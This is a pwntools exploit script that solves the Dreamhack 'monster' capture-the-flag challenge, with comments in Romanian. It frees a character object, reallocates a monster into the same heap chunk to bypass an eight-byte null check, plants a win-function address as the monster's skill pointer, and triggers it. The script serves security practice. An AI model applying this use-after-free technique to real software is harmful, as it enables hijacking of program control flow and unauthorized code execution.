from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/monster/deploy/chall')

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:19081'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
win = 0x401C42

#ideea: creezi un character, apoi ii dai free;
#cand se creeaza un montstru tot acolo, verifica cu isnull()
#isnull() verifica doar primii 8 bytes sa fie null
#in heap, la momentul verificarii, slot e gol dar primii 8 bytes sunt ocupati de fd.

#practic se sare peste initializare la monstru si controlam noi skill(*)

#create slot
p.recvuntil(b">> ")
p.sendline(b"1")

p.recvuntil(b": ")
p.sendline(b"1")

#create character
p.recvuntil(b">> ")
p.sendline(b"2")

p.recvuntil(b": ")
p.sendline(b"1")

#character name
p.recvuntil(b": ")
p.sendline(b"gaga")

#character profile - here's where we set what will be monster's skill -or

p.recvuntil(b": ")
#difference is 8 bytes bc of uint64 type, which monster doesn't have
p.sendline(b"A"*0x28 + p64(win))


#delete character
p.recvuntil(b">> ")
p.sendline(b"3")

p.recvuntil(b": ")
p.sendline(b"1")

#create monster
p.recvuntil(b">> ")
p.sendline(b"4")

#gdb.attach(p)

#create new slot for new character
p.recvuntil(b">> ")
p.sendline(b"1")

p.recvuntil(b": ")
p.sendline(b"2")

#create new character (dummy, doesn't matter)

p.recvuntil(b">> ")
p.sendline(b"2")

p.recvuntil(b": ")
p.sendline(b"2")

#character name
p.recvuntil(b": ")
p.sendline(b"gaga")

#character profile
p.recvuntil(b": ")
p.sendline(b"A"*10)

#now we can fight - trigger fight - will trigger monster fake skilL!

p.recvuntil(b">> ")
p.sendline(b"5")

p.recvuntil(b": ")
p.sendline(b"2")

p.interactive()
